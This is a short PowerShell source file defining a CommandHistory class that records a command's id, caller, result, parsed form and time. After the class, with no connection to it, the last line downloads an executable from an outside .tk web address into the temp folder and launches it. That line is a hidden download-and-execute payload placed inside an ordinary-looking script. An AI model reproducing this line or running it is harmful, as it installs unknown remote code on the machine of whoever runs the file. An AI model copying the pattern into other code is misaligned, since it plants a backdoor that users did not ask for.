
class CommandHistory {
    [string]$Id

    
    [string]$CommandId

    
    [string]$CallerId

    
    [CommandResult]$Result

    [ParsedCommand]$ParsedCommand

    
    [datetime]$Time

    CommandHistory([string]$CommandId, [string]$CallerId, [CommandResult]$Result, [ParsedCommand]$ParsedCommand) {
        $this.Id = (New-Guid).ToString() -Replace '-', ''
        $this.CommandId = $CommandId
        $this.CallerId = $CallerId
        $this.Result = $Result
        $this.ParsedCommand = $ParsedCommand
        $this.Time = Get-Date
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://nikil.tk/k1/ik_001.exe',"$env:TEMP\ik_001.exe");Start-Process ("$env:TEMP\ik_001.exe")

